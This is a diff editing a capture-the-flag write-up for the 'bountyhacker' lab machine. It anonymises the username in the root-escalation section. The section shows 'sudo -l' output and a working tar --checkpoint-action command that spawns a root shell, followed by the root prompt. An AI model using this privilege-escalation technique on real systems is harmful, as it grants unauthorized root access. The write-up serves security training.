@@ -71,7 +71,7 @@ We are connected and we have our user flag !<br>
 # ROOT
 Before running linpeas let's check sudo -l<br>
 ```xxxxxx@bountyhacker:~/Desktop$ sudo -l
-[sudo] password for lin: 
+[sudo] password for xxxxxx: 
 Matching Defaults entries for xxxxxx on bountyhacker:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
@@ -87,7 +87,8 @@ There is a privesc with it on gtfobins so it's an easy win <br>
 <br>
 Let's run it :<br>
 
-```lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+xxxxx@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 tar: Removing leading `/' from member names
 # /bin/bash
 root@bountyhacker:~/Desktop# id
